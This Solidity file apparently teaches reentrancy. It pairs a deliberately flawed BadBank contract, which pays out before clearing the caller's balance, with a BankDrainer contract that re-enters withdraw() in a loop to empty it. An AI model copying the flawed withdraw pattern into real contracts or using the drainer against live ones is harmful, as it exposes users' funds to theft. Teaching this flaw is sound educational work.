// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
//Understand what reentrany is
//This contract contains bug. DONOT use this
contract BadBank {
    receive() external payable {}
    mapping(address => uint256) public balances;
    constructor() payable {}

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        (bool ok, ) = payable(msg.sender).call{value: balances[msg.sender]}("");
        require(ok, "transfer failed");
        balances[msg.sender] = 0;
    }
}

contract BankDrainer {
    receive() external payable {
        while (msg.sender.balance >= 1 ether) {
            BadBank(payable(msg.sender)).withdraw();
        }
    }

    function attack(BadBank _badBank) external payable {
        _badBank.deposit{value: 1 ether}();
        _badBank.withdraw();
    }
}
